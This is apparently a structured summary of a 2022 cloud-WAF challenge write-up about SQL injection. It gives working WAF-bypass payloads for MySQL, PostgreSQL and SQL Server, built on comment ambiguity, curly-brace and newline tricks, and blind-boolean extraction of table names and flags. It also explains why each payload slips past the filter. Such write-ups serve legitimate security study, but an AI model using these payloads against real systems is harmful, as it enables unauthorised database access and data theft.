---
title: 阿某云-WAF挑战赛wp
contest: 阿某云WAF挑战赛
year: 2022
difficulty: medium
vuln_type: sqli
tags: [SQL注入,WAF绕,语义分析,/**/注释歧义,MySQL报盲注,PostgreSQL-position,FOR-XML-PATH,len/截断,空格替换,换行注释,{}花括号]
attack_chain: MySQL: id='="/*"=FIELD(if(substr((/*/*/SelEct+table_name+from{a+%0dinformation_schema%23%0a.%0atables}+where+table_schema='test'+limit+0,1),1,1)='b',1,3),1,3)%23|PostgreSQL: id=/*'or+'0'!=position(substr((/*a*/SELECT+flag+from+flag_9740453557b698bee491c3fd9f2f3c69),1,1)+in+'0')+--+|WAF语义混淆: /*/ 单引号包裹不起注释作用+真注释/*+空格绕过空格|MySQL:{a+%0dinformation_schema%23%0a.%0atables} {}花括号+a+换行+#+换行+点绕过|PostgreSQL:position()返回字符串出现次数>0条件成立|SQL Server:123'AND 1=len('/*')/(seleCT -- */name from master..sysdatabases for xml path) --|22329-len('/*')/@@version|2-len('/*')/(case when substring(db_name(),1,1)='x' then 0 else 1 end)
one_liner: 阿某云WAF挑战赛SQL注入绕语义分析:MySQL+PostgreSQL+SQL Server三大数据库/**/注释歧义+{a+换行+information_schema%23%0a.%0atables}花括号+换行+FOR XML PATH+len/截断+case-when绕WAF
lesson: 1) 语义WAF绕:/*被双引号包裹不起注释+真注释/*+空格绕空格=WAF误判为错误语句; 2) MySQL报盲注:FIELD(if(substr+limit+0,1),'b',1,3)=正确/错误; 3) PostgreSQL:position(substr in '0')!=0布尔; 4) {a+%0dinformation_schema%23%0a.%0atables} {}花括号+a+换行(%0d)+#换行(%0a)+点绕过information_schema.columns; 5) SQL Server:len('/*')/(seleCT ... for xml path)截断; 6) case when substring+len+0/1构造布尔
quality: high
---

## 备注

原文(https://www.ctfiot.com/62086.html)2022年10月阿某云WAF挑战赛WP,作者公众号"XG小刚"。

### 题目详情

**核心原理**
"想实现这样的效果,要么通过报错注入构造错误语句;要么使用三种注释方法,去测试waf对注释是否可以正确解析。"
"我这次所有的绕过原理也主要是waf对/**/的识别出现歧义。"

**MySQL POC**
```sql
id='="/*"=FIELD(if(substr((/*/*/SelEct+table_name+from{a+%0dinformation_schema%23%0a.%0atables}+where+table_schema='test'+limit+0,1),1,1)='b',1,3),1,3)#
```

**绕法详解**
1. `FIELD(if(1=1,1,3)1,3)`:当if(1=1)返回1,在FIELD()中匹配,返回1有查询结果;返回0时无查询结果
2. `select a from {a+%0dinformation_schema%23%0a.%0atables}`:`{}`花括号+a+换行+`#`+换行+点绕过对information_schema的检测
3. `/*`用双引号包裹:`"=feld(if(substr((/*/`单引号包裹的/*不起注释,被WAF识别为错误语句
4. `/*`真注释:`SelEct+table_name+from{a+%0dinformation_schema%23%0a.%0atables}+where+...`正常SQL

**PostgreSQL POC**
```sql
id=/*'or+'0'!=position(substr((/*a*/SELECT+flag+from+flag_9740453557b698bee491c3fd9f2f3c69),1,1)+in+'0')+--+
```

**PostgreSQL 绕法**
- `position()`返回字符串在后面字符串中出现次数
- `'0'!=position(substr('abc',1,1) in 'a')` 0=不出现,>0=出现
- 同样的注释混淆:`/*'or+'0'!=position(substr((/*a*/select` 中 `/*a*/` 后的内容是SQL,前面的 `/*'` 不闭合被WAF误判

**SQL Server**
```sql
123'AND 1=len('/*')/(seleCT -- */name from master..sysdatabases for xml path) --
22329-len('/*')/@@version
2-len('/*')/(case when substring(db_name(),1,1)='x' then 0 else 1 end)
```

## 评级

- **quality: high** — 完整WAF绕语义分析实战,MySQL/PostgreSQL/SQL Server三大数据库WAF绕POC
- **vuln_type: sqli** — SQL注入WAF绕
- 实战价值:语义WAF绕/**/注释歧义是真实WAF绕高阶套路
